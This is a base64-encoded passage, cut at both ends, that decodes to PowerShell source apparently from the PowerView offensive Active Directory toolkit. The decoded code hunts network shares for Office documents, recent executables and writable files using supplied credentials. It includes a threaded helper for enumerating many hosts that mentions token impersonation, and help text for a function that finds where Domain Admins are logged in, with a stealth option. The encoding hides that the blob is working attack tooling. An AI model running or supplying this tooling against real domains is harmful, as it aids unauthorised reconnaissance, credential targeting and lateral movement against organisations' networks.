lvbicpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0RhdGVUaW1lXQogICAgICAgICRMYXN0V3JpdGVUaW1lLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnRmlsZVNwZWNpZmljYXRpb24nKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtEYXRlVGltZV0KICAgICAgICAkQ3JlYXRpb25UaW1lLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnT2ZmaWNlRG9jcycpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJE9mZmljZURvY3MsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdGcmVzaEVYRXMnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRGcmVzaEVYRXMsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdGaWxlU3BlY2lmaWNhdGlvbicpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEV4Y2x1ZGVGb2xkZXJzLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnRmlsZVNwZWNpZmljYXRpb24nKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRFeGNsdWRlSGlkZGVuLAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRDaGVja1dyaXRlQWNjZXNzLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gIEB7CiAgICAgICAgICAgICdSZWN1cnNlJyA9ICRUcnVlCiAgICAgICAgICAgICdFcnJvckFjdGlvbicgPSAnU2lsZW50bHlDb250aW51ZScKICAgICAgICAgICAgJ0luY2x1ZGUnID0gJEluY2x1ZGUKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snT2ZmaWNlRG9jcyddKSB7CiAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snSW5jbHVkZSddID0gQCgnKi5kb2MnLCAnKi5kb2N4JywgJyoueGxzJywgJyoueGxzeCcsICcqLnBwdCcsICcqLnBwdHgnKQogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRnJlc2hFWEVzJ10pIHsKICAgICAgICAgICAgIyBmaW5kIC5leGUncyBhY2Nlc3NlZCB3aXRoaW4gdGhlIGxhc3QgNyBkYXlzCiAgICAgICAgICAgICRMYXN0QWNjZXNzVGltZSA9IChHZXQtRGF0ZSkuQWRkRGF5cygtNykuVG9TdHJpbmcoJ01NL2RkL3l5eXknKQogICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0luY2x1ZGUnXSA9IEAoJyouZXhlJykKICAgICAgICB9CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydGb3JjZSddID0gLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ0V4Y2x1ZGVIaWRkZW4nXQoKICAgICAgICAkTWFwcGVkQ29tcHV0ZXJzID0gQHt9CgogICAgICAgIGZ1bmN0aW9uIFRlc3QtV3JpdGUgewogICAgICAgICAgICAjIHNob3J0IGhlbHBlciB0byBjaGVjayBpcyB0aGUgY3VycmVudCB1c2VyIGNhbiB3cml0ZSB0byBhIGZpbGUKICAgICAgICAgICAgW0NtZGxldEJpbmRpbmcoKV1QYXJhbShbU3RyaW5nXSRQYXRoKQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJEZpbGV0ZXN0ID0gW0lPLkZpbGVdOjpPcGVuV3JpdGUoJFBhdGgpCiAgICAgICAgICAgICAgICAkRmlsZXRlc3QuQ2xvc2UoKQogICAgICAgICAgICAgICAgJFRydWUKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAkRmFsc2UKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkVGFyZ2V0UGF0aCBpbiAkUGF0aCkgewogICAgICAgICAgICBpZiAoKCRUYXJnZXRQYXRoIC1NYXRjaCAnXFxcXC4qXFwuKicpIC1hbmQgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSkgewogICAgICAgICAgICAgICAgJEhvc3RDb21wdXRlciA9IChOZXctT2JqZWN0IFN5c3RlbS5VcmkoJFRhcmdldFBhdGgpKS5Ib3N0CiAgICAgICAgICAgICAgICBpZiAoLW5vdCAkTWFwcGVkQ29tcHV0ZXJzWyRIb3N0Q29tcHV0ZXJdKSB7CiAgICAgICAgICAgICAgICAgICAgIyBtYXAgSVBDJCB0byB0aGlzIGNvbXB1dGVyIGlmIGl0J3Mgbm90IGFscmVhZHkKICAgICAgICAgICAgICAgICAgICBBZGQtUmVtb3RlQ29ubmVjdGlvbiAtQ29tcHV0ZXJOYW1lICRIb3N0Q29tcHV0ZXIgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICAgICAgICAgICAgICAkTWFwcGVkQ29tcHV0ZXJzWyRIb3N0Q29tcHV0ZXJdID0gJFRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydQYXRoJ10gPSAkVGFyZ2V0UGF0aAogICAgICAgICAgICBHZXQtQ2hpbGRJdGVtIEBTZWFyY2hlckFyZ3VtZW50cyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICMgY2hlY2sgaWYgd2UncmUgZXhjbHVkaW5nIGZvbGRlcnMKICAgICAgICAgICAgICAgICRDb250aW51ZSA9ICRUcnVlCiAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydFeGNsdWRlRm9sZGVycyddIC1hbmQgKCRfLlBTSXNDb250YWluZXIpKSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRXhjbHVkaW5nOiAkKCRfLkZ1bGxOYW1lKSIKICAgICAgICAgICAgICAgICAgICAkQ29udGludWUgPSAkRmFsc2UKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkTGFzdEFjY2Vzc1RpbWUgLWFuZCAoJF8uTGFzdEFjY2Vzc1RpbWUgLWx0ICRMYXN0QWNjZXNzVGltZSkpIHsKICAgICAgICAgICAgICAgICAgICAkQ29udGludWUgPSAkRmFsc2UKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xhc3RXcml0ZVRpbWUnXSAtYW5kICgkXy5MYXN0V3JpdGVUaW1lIC1sdCAkTGFzdFdyaXRlVGltZSkpIHsKICAgICAgICAgICAgICAgICAgICAkQ29udGludWUgPSAkRmFsc2UKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWF0aW9uVGltZSddIC1hbmQgKCRfLkNyZWF0aW9uVGltZSAtbHQgJENyZWF0aW9uVGltZSkpIHsKICAgICAgICAgICAgICAgICAgICAkQ29udGludWUgPSAkRmFsc2UKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NoZWNrV3JpdGVBY2Nlc3MnXSAtYW5kICgtbm90IChUZXN0LVdyaXRlIC1QYXRoICRfLkZ1bGxOYW1lKSkpIHsKICAgICAgICAgICAgICAgICAgICAkQ29udGludWUgPSAkRmFsc2UKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkQ29udGludWUpIHsKICAgICAgICAgICAgICAgICAgICAkRmlsZVBhcmFtcyA9IEB7CiAgICAgICAgICAgICAgICAgICAgICAgICdQYXRoJyA9ICRfLkZ1bGxOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICdPd25lcicgPSAkKChHZXQtQWNsICRfLkZ1bGxOYW1lKS5Pd25lcikKICAgICAgICAgICAgICAgICAgICAgICAgJ0xhc3RBY2Nlc3NUaW1lJyA9ICRfLkxhc3RBY2Nlc3NUaW1lCiAgICAgICAgICAgICAgICAgICAgICAgICdMYXN0V3JpdGVUaW1lJyA9ICRfLkxhc3RXcml0ZVRpbWUKICAgICAgICAgICAgICAgICAgICAgICAgJ0NyZWF0aW9uVGltZScgPSAkXy5DcmVhdGlvblRpbWUKICAgICAgICAgICAgICAgICAgICAgICAgJ0xlbmd0aCcgPSAkXy5MZW5ndGgKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJEZvdW5kRmlsZSA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0IC1Qcm9wZXJ0eSAkRmlsZVBhcmFtcwogICAgICAgICAgICAgICAgICAgICRGb3VuZEZpbGUuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkZvdW5kRmlsZScpCiAgICAgICAgICAgICAgICAgICAgJEZvdW5kRmlsZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIEVORCB7CiAgICAgICAgIyByZW1vdmUgdGhlIElQQyQgbWFwcGluZ3MKICAgICAgICAkTWFwcGVkQ29tcHV0ZXJzLktleXMgfCBSZW1vdmUtUmVtb3RlQ29ubmVjdGlvbgogICAgfQp9CgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIwojICdNZXRhJy1mdW5jdGlvbnMgc3RhcnQgYmVsb3cKIwojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKZnVuY3Rpb24gTmV3LVRocmVhZGVkRnVuY3Rpb24gewogICAgIyBIZWxwZXIgdXNlZCBieSBhbnkgdGhyZWFkZWQgaG9zdCBlbnVtZXJhdGlvbiBmdW5jdGlvbnMKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1VzZVNob3VsZFByb2Nlc3NGb3JTdGF0ZUNoYW5naW5nRnVuY3Rpb25zJywgJycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5TY3JpcHRCbG9ja10KICAgICAgICAkU2NyaXB0QmxvY2ssCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyKV0KICAgICAgICBbSGFzaHRhYmxlXQogICAgICAgICRTY3JpcHRQYXJhbWV0ZXJzLAoKICAgICAgICBbSW50XQogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsICAxMDApXQogICAgICAgICRUaHJlYWRzID0gMjAsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJE5vSW1wb3J0cwogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAjIEFkYXB0ZWQgZnJvbToKICAgICAgICAjICAgaHR0cDovL3Bvd2Vyc2hlbGwub3JnL3dwL2ZvcnVtcy90b3BpYy9pbnZwa2UtcGFyYWxsZWwtbmVlZC1oZWxwLXRvLWNsb25lLXRoZS1jdXJyZW50LXJ1bnNwYWNlLwogICAgICAgICRTZXNzaW9uU3RhdGUgPSBbU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5SdW5zcGFjZXMuSW5pdGlhbFNlc3Npb25TdGF0ZV06OkNyZWF0ZURlZmF1bHQoKQoKICAgICAgICAjICMgJFNlc3Npb25TdGF0ZS5BcGFydG1lbnRTdGF0ZSA9IFtTeXN0ZW0uVGhyZWFkaW5nLlRocmVhZF06OkN1cnJlbnRUaHJlYWQuR2V0QXBhcnRtZW50U3RhdGUoKQogICAgICAgICMgZm9yY2UgYSBzaW5nbGUtdGhyZWFkZWQgYXBhcnRtZW50IHN0YXRlIChmb3IgdG9rZW4taW1wZXJzb25hdGlvbiBzdHVmZnopCiAgICAgICAgJFNlc3Npb25TdGF0ZS5BcGFydG1lbnRTdGF0ZSA9IFtTeXN0ZW0uVGhyZWFkaW5nLkFwYXJ0bWVudFN0YXRlXTo6U1RBCgogICAgICAgICMgaW1wb3J0IHRoZSBjdXJyZW50IHNlc3Npb24gc3RhdGUncyB2YXJpYWJsZXMgYW5kIGZ1bmN0aW9ucyBzbyB0aGUgY2hhaW5lZCBQb3dlclZpZXcKICAgICAgICAjICAgZnVuY3Rpb25hbGl0eSBjYW4gYmUgdXNlZCBieSB0aGUgdGhyZWFkZWQgYmxvY2tzCiAgICAgICAgaWYgKC1ub3QgJE5vSW1wb3J0cykgewogICAgICAgICAgICAjIGdyYWIgYWxsIHRoZSBjdXJyZW50IHZhcmlhYmxlcyBmb3IgdGhpcyBydW5zcGFjZQogICAgICAgICAgICAkTXlWYXJzID0gR2V0LVZhcmlhYmxlIC1TY29wZSAyCgogICAgICAgICAgICAjIHRoZXNlIFZhcmlhYmxlcyBhcmUgYWRkZWQgYnkgUnVuc3BhY2UuT3BlbigpIE1ldGhvZCBhbmQgcHJvZHVjZSBTdG9wIGVycm9ycyBpZiB5b3UgYWRkIHRoZW0gdHdpY2UKICAgICAgICAgICAgJFZvcmJpZGRlblZhcnMgPSBAKCc/JywnYXJncycsJ0NvbnNvbGVGaWxlTmFtZScsJ0Vycm9yJywnRXhlY3V0aW9uQ29udGV4dCcsJ2ZhbHNlJywnSE9NRScsJ0hvc3QnLCdpbnB1dCcsJ0lucHV0T2JqZWN0JywnTWF4aW11bUFsaWFzQ291bnQnLCdNYXhpbXVtRHJpdmVDb3VudCcsJ01heGltdW1FcnJvckNvdW50JywnTWF4aW11bUZ1bmN0aW9uQ291bnQnLCdNYXhpbXVtSGlzdG9yeUNvdW50JywnTWF4aW11bVZhcmlhYmxlQ291bnQnLCdNeUludm9jYXRpb24nLCdudWxsJywnUElEJywnUFNCb3VuZFBhcmFtZXRlcnMnLCdQU0NvbW1hbmRQYXRoJywnUFNDdWx0dXJlJywnUFNEZWZhdWx0UGFyYW1ldGVyVmFsdWVzJywnUFNIT01FJywnUFNTY3JpcHRSb290JywnUFNVSUN1bHR1cmUnLCdQU1ZlcnNpb25UYWJsZScsJ1BXRCcsJ1NoZWxsSWQnLCdTeW5jaHJvbml6ZWRIYXNoJywndHJ1ZScpCgogICAgICAgICAgICAjIGFkZCBWYXJpYWJsZXMgZnJvbSBQYXJlbnQgU2NvcGUgKGN1cnJlbnQgcnVuc3BhY2UpIGludG8gdGhlIEluaXRpYWxTZXNzaW9uU3RhdGUKICAgICAgICAgICAgRm9yRWFjaCAoJFZhciBpbiAkTXlWYXJzKSB7CiAgICAgICAgICAgICAgICBpZiAoJFZvcmJpZGRlblZhcnMgLU5vdENvbnRhaW5zICRWYXIuTmFtZSkgewogICAgICAgICAgICAgICAgJFNlc3Npb25TdGF0ZS5WYXJpYWJsZXMuQWRkKChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnNwYWNlcy5TZXNzaW9uU3RhdGVWYXJpYWJsZUVudHJ5IC1Bcmd1bWVudExpc3QgJFZhci5uYW1lLCRWYXIuVmFsdWUsJFZhci5kZXNjcmlwdGlvbiwkVmFyLm9wdGlvbnMsJFZhci5hdHRyaWJ1dGVzKSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgIyBhZGQgRnVuY3Rpb25zIGZyb20gY3VycmVudCBydW5zcGFjZSB0byB0aGUgSW5pdGlhbFNlc3Npb25TdGF0ZQogICAgICAgICAgICBGb3JFYWNoICgkRnVuY3Rpb24gaW4gKEdldC1DaGlsZEl0ZW0gRnVuY3Rpb246KSkgewogICAgICAgICAgICAgICAgJFNlc3Npb25TdGF0ZS5Db21tYW5kcy5BZGQoKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUnVuc3BhY2VzLlNlc3Npb25TdGF0ZUZ1bmN0aW9uRW50cnkgLUFyZ3VtZW50TGlzdCAkRnVuY3Rpb24uTmFtZSwgJEZ1bmN0aW9uLkRlZmluaXRpb24pKQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAjIHRocmVhZGluZyBhZGFwdGVkIGZyb20KICAgICAgICAjIGh0dHBzOi8vZ2l0aHViLmNvbS9kYXJrb3BlcmF0b3IvUG9zaC1TZWNNb2QvYmxvYi9tYXN0ZXIvRGlzY292ZXJ5L0Rpc2NvdmVyeS5wc20xI0w0MDcKICAgICAgICAjICAgVGhhbmtzIENhcmxvcyEKCiAgICAgICAgIyBjcmVhdGUgYSBwb29sIG9mIG1heFRocmVhZCBydW5zcGFjZXMKICAgICAgICAkUG9vbCA9IFtSdW5zcGFjZUZhY3RvcnldOjpDcmVhdGVSdW5zcGFjZVBvb2woMSwgJFRocmVhZHMsICRTZXNzaW9uU3RhdGUsICRIb3N0KQogICAgICAgICRQb29sLk9wZW4oKQoKICAgICAgICAjIGRvIHNvbWUgdHJpY2tlcnkgdG8gZ2V0IHRoZSBwcm9wZXIgQmVnaW5JbnZva2UoKSBtZXRob2QgdGhhdCBhbGxvd3MgZm9yIGFuIG91dHB1dCBxdWV1ZQogICAgICAgICRNZXRob2QgPSAkTnVsbAogICAgICAgIEZvckVhY2ggKCRNIGluIFtQb3dlclNoZWxsXS5HZXRNZXRob2RzKCkgfCBXaGVyZS1PYmplY3QgeyAkXy5OYW1lIC1lcSAnQmVnaW5JbnZva2UnIH0pIHsKICAgICAgICAgICAgJE1ldGhvZFBhcmFtZXRlcnMgPSAkTS5HZXRQYXJhbWV0ZXJzKCkKICAgICAgICAgICAgaWYgKCgkTWV0aG9kUGFyYW1ldGVycy5Db3VudCAtZXEgMikgLWFuZCAkTWV0aG9kUGFyYW1ldGVyc1swXS5OYW1lIC1lcSAnaW5wdXQnIC1hbmQgJE1ldGhvZFBhcmFtZXRlcnNbMV0uTmFtZSAtZXEgJ291dHB1dCcpIHsKICAgICAgICAgICAgICAgICRNZXRob2QgPSAkTS5NYWtlR2VuZXJpY01ldGhvZChbT2JqZWN0XSwgW09iamVjdF0pCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAkSm9icyA9IEAoKQogICAgICAgICRDb21wdXRlck5hbWUgPSAkQ29tcHV0ZXJOYW1lIHwgV2hlcmUtT2JqZWN0IHskXyAtYW5kICRfLlRyaW0oKX0KICAgICAgICBXcml0ZS1WZXJib3NlICJbTmV3LVRocmVhZGVkRnVuY3Rpb25dIFRvdGFsIG51bWJlciBvZiBob3N0czogJCgkQ29tcHV0ZXJOYW1lLmNvdW50KSIKCiAgICAgICAgIyBwYXJ0aXRpb24gYWxsIGhvc3RzIGZyb20gLUNvbXB1dGVyTmFtZSBpbnRvICRUaHJlYWRzIG51bWJlciBvZiBncm91cHMKICAgICAgICBpZiAoJFRocmVhZHMgLWdlICRDb21wdXRlck5hbWUuTGVuZ3RoKSB7CiAgICAgICAgICAgICRUaHJlYWRzID0gJENvbXB1dGVyTmFtZS5MZW5ndGgKICAgICAgICB9CiAgICAgICAgJEVsZW1lbnRTcGxpdFNpemUgPSBbSW50XSgkQ29tcHV0ZXJOYW1lLkxlbmd0aC8kVGhyZWFkcykKICAgICAgICAkQ29tcHV0ZXJOYW1lUGFydGl0aW9uZWQgPSBAKCkKICAgICAgICAkU3RhcnQgPSAwCiAgICAgICAgJEVuZCA9ICRFbGVtZW50U3BsaXRTaXplCgogICAgICAgIGZvcigkaSA9IDE7ICRpIC1sZSAkVGhyZWFkczsgJGkrKykgewogICAgICAgICAgICAkTGlzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgICAgICAgICBpZiAoJGkgLWVxICRUaHJlYWRzKSB7CiAgICAgICAgICAgICAgICAkRW5kID0gJENvbXB1dGVyTmFtZS5MZW5ndGgKICAgICAgICAgICAgfQogICAgICAgICAgICAkTGlzdC5BZGRSYW5nZSgkQ29tcHV0ZXJOYW1lWyRTdGFydC4uKCRFbmQtMSldKQogICAgICAgICAgICAkU3RhcnQgKz0gJEVsZW1lbnRTcGxpdFNpemUKICAgICAgICAgICAgJEVuZCArPSAkRWxlbWVudFNwbGl0U2l6ZQogICAgICAgICAgICAkQ29tcHV0ZXJOYW1lUGFydGl0aW9uZWQgKz0gQCgsQCgkTGlzdC5Ub0FycmF5KCkpKQogICAgICAgIH0KCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW05ldy1UaHJlYWRlZEZ1bmN0aW9uXSBUb3RhbCBudW1iZXIgb2YgdGhyZWFkcy9wYXJ0aXRpb25zOiAkVGhyZWFkcyIKCiAgICAgICAgRm9yRWFjaCAoJENvbXB1dGVyTmFtZVBhcnRpdGlvbiBpbiAkQ29tcHV0ZXJOYW1lUGFydGl0aW9uZWQpIHsKICAgICAgICAgICAgIyBjcmVhdGUgYSAicG93ZXJzaGVsbCBwaXBlbGluZSBydW5uZXIiCiAgICAgICAgICAgICRQb3dlclNoZWxsID0gW1Bvd2VyU2hlbGxdOjpDcmVhdGUoKQogICAgICAgICAgICAkUG93ZXJTaGVsbC5ydW5zcGFjZXBvb2wgPSAkUG9vbAoKICAgICAgICAgICAgIyBhZGQgdGhlIHNjcmlwdCBibG9jayArIGFyZ3VtZW50cyB3aXRoIHRoZSBnaXZlbiBjb21wdXRlciBwYXJ0aXRpb24KICAgICAgICAgICAgJE51bGwgPSAkUG93ZXJTaGVsbC5BZGRTY3JpcHQoJFNjcmlwdEJsb2NrKS5BZGRQYXJhbWV0ZXIoJ0NvbXB1dGVyTmFtZScsICRDb21wdXRlck5hbWVQYXJ0aXRpb24pCiAgICAgICAgICAgIGlmICgkU2NyaXB0UGFyYW1ldGVycykgewogICAgICAgICAgICAgICAgRm9yRWFjaCAoJFBhcmFtIGluICRTY3JpcHRQYXJhbWV0ZXJzLkdldEVudW1lcmF0b3IoKSkgewogICAgICAgICAgICAgICAgICAgICROdWxsID0gJFBvd2VyU2hlbGwuQWRkUGFyYW1ldGVyKCRQYXJhbS5OYW1lLCAkUGFyYW0uVmFsdWUpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICMgY3JlYXRlIHRoZSBvdXRwdXQgcXVldWUKICAgICAgICAgICAgJE91dHB1dCA9IE5ldy1PYmplY3QgTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTRGF0YUNvbGxlY3Rpb25bT2JqZWN0XQoKICAgICAgICAgICAgIyBraWNrIG9mZiBleGVjdXRpb24gdXNpbmcgdGhlIEJlZ2luSW52b2soKSBtZXRob2QgdGhhdCBhbGxvd3MgcXVldWVzCiAgICAgICAgICAgICRKb2JzICs9IEB7CiAgICAgICAgICAgICAgICBQUyA9ICRQb3dlclNoZWxsCiAgICAgICAgICAgICAgICBPdXRwdXQgPSAkT3V0cHV0CiAgICAgICAgICAgICAgICBSZXN1bHQgPSAkTWV0aG9kLkludm9rZSgkUG93ZXJTaGVsbCwgQCgkTnVsbCwgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0RhdGFDb2xsZWN0aW9uW09iamVjdF1dJE91dHB1dCkpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgRU5EIHsKICAgICAgICBXcml0ZS1WZXJib3NlICJbTmV3LVRocmVhZGVkRnVuY3Rpb25dIFRocmVhZHMgZXhlY3V0aW5nIgoKICAgICAgICAjIGNvbnRpbnVvdXNseSBsb29wIHRocm91Z2ggZWFjaCBqb2IgcXVldWUsIGNvbnN1bWluZyBvdXRwdXQgYXMgYXBwcm9wcmlhdGUKICAgICAgICBEbyB7CiAgICAgICAgICAgIEZvckVhY2ggKCRKb2IgaW4gJEpvYnMpIHsKICAgICAgICAgICAgICAgICRKb2IuT3V0cHV0LlJlYWRBbGwoKQogICAgICAgICAgICB9CiAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDEKICAgICAgICB9CiAgICAgICAgV2hpbGUgKCgkSm9icyB8IFdoZXJlLU9iamVjdCB7IC1ub3QgJF8uUmVzdWx0LklzQ29tcGxldGVkIH0pLkNvdW50IC1ndCAwKQoKICAgICAgICAkU2xlZXBTZWNvbmRzID0gMTAwCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW05ldy1UaHJlYWRlZEZ1bmN0aW9uXSBXYWl0aW5nICRTbGVlcFNlY29uZHMgc2Vjb25kcyBmb3IgZmluYWwgY2xlYW51cC4uLiIKCiAgICAgICAgIyBjbGVhbnVwLSBtYWtlIHN1cmUgd2UgZGlkbid0IG1pc3MgYW55dGhpbmcKICAgICAgICBmb3IgKCRpPTA7ICRpIC1sdCAkU2xlZXBTZWNvbmRzOyAkaSsrKSB7CiAgICAgICAgICAgIEZvckVhY2ggKCRKb2IgaW4gJEpvYnMpIHsKICAgICAgICAgICAgICAgICRKb2IuT3V0cHV0LlJlYWRBbGwoKQogICAgICAgICAgICAgICAgJEpvYi5QUy5EaXNwb3NlKCkKICAgICAgICAgICAgfQogICAgICAgICAgICBTdGFydC1TbGVlcCAtUyAxCiAgICAgICAgfQoKICAgICAgICAkUG9vbC5EaXNwb3NlKCkKICAgICAgICBXcml0ZS1WZXJib3NlICJbTmV3LVRocmVhZGVkRnVuY3Rpb25dIGFsbCB0aHJlYWRzIGNvbXBsZXRlZCIKICAgIH0KfQoKCmZ1bmN0aW9uIEZpbmQtRG9tYWluVXNlckxvY2F0aW9uIHsKPCMKLlNZTk9QU0lTCgpGaW5kcyBkb21haW4gbWFjaGluZXMgd2hlcmUgc3BlY2lmaWMgdXNlcnMgYXJlIGxvZ2dlZCBpbnRvLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluRmlsZVNlcnZlciwgR2V0LURvbWFpbkRGU1NoYXJlLCBHZXQtRG9tYWluQ29udHJvbGxlciwgR2V0LURvbWFpbkNvbXB1dGVyLCBHZXQtRG9tYWluVXNlciwgR2V0LURvbWFpbkdyb3VwTWVtYmVyLCBJbnZva2UtVXNlckltcGVyc29uYXRpb24sIEludm9rZS1SZXZlcnRUb1NlbGYsIEdldC1OZXRTZXNzaW9uLCBUZXN0LUFkbWluQWNjZXNzLCBHZXQtTmV0TG9nZ2Vkb24sIFJlc29sdmUtSVBBZGRyZXNzLCBOZXctVGhyZWFkZWRGdW5jdGlvbiAgCgouREVTQ1JJUFRJT04KClRoaXMgZnVuY3Rpb24gZW51bWVyYXRlcyBhbGwgbWFjaGluZXMgb24gdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZG9tYWluCnVzaW5nIEdldC1Eb21haW5Db21wdXRlciwgYW5kIHF1ZXJpZXMgdGhlIGRvbWFpbiBmb3IgdXNlcnMgb2YgYSBzcGVjaWZpZWQgZ3JvdXAKKGRlZmF1bHQgJ0RvbWFpbiBBZG1pbnMnKSB3aXRoIEdldC1Eb21haW5Hcm91cE1lbWJlci4gVGhlbiBmb3IgZWFjaCBzZXJ2ZXIgdGhlCmZ1bmN0aW9uIGVudW1lcmF0ZXMgYW55IGFjdGl2ZSB1c2VyIHNlc3Npb25zIHdpdGggR2V0LU5ldFNlc3Npb24vR2V0LU5ldExvZ2dlZG9uClRoZSBmb3VuZCB1c2VyIGxpc3QgaXMgY29tcGFyZWQgYWdhaW5zdCB0aGUgdGFyZ2V0IGxpc3QsIGFuZCBhbnkgbWF0Y2hlcyBhcmUKZGlzcGxheWVkLiBJZiAtU2hvd0FsbCBpcyBzcGVjaWZpZWQsIGFsbCByZXN1bHRzIGFyZSBkaXNwbGF5ZWQgaW5zdGVhZCBvZgp0aGUgZmlsdGVyZWQgc2V0LiBJZiAtU3RlYWx0aCBpcyBzcGVjaWZpZWQsIHRoZW4gbGlrZWx5IGhpZ2hseS10cmFmZmljZWQgc2VydmVycwphcmUgZW51bWVyYXRlZCB3aXRoIEdldC1Eb21haW5GaWxlU2VydmVyL0dldC1Eb21haW5Db250cm9sbGVyLCBhbmQgc2Vzc2lvbgplbnVtZXJhdGlvbiBpcyBleGVjdXRlZCBvbmx5IGFn